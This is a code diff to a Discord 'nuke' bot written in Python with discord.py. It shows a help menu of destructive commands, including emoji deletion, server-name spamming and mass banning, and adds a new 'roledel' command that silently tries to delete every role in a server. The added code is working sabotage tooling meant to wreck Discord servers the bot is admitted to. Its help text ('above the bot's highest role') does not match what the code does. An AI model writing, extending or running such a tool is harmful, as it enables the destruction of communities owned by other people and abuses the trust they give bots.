@@ -15,9 +15,9 @@ bot.remove_command('help')
 
 @bot.event
 async def on_ready():
+   print('Logged in as {}'.format(bot.user.name))
    game = discord.Game("Nuking Discord Filth")
    await bot.change_presence(status=discord.Status.online, activity=game)
-   print("Bot is Online")
    print("Bot made by Kaotic, Bancer and XxGamerBroskixX")
 
 #used to keep invites to where the bot is added to not needed for bot to function just extra if you know how it works
@@ -65,6 +65,7 @@ async def cmds(ctx):
  embed.add_field(name="emojidel",value="Deletes all emojis (Can be slow)", inline=False)
  embed.add_field(name="namespam",value="Constantly changes the server name", inline=False)
  embed.add_field(name="info",value="Gives user info.", inline=False)
+ embed.add_field(name="roledel",value="Deletes roles above the bots higest role.", inline=False)
 
  await ctx.send(embed=embed)
 
@@ -159,6 +160,16 @@ async def ban(ctx):
             except:
                 print (f"{user.name} has FAILED to be banned from {ctx.guild.name}")
         print ("Action Completed: Banned")  
+
+@bot.command(pass_context=True)
+async def roledel(ctx):
+  await ctx.message.delete()
+  for role in list(ctx.guild.roles):
+            try:
+                await role.delete()
+                print (f"{role.name} has been deleted in {ctx.guild.name}")
+            except:
+                print (f"{role.name} has NOT been deleted in {ctx.guild.name}")
 
 @bot.command(pass_context=True)
 async def clear(ctx, amount=100000):
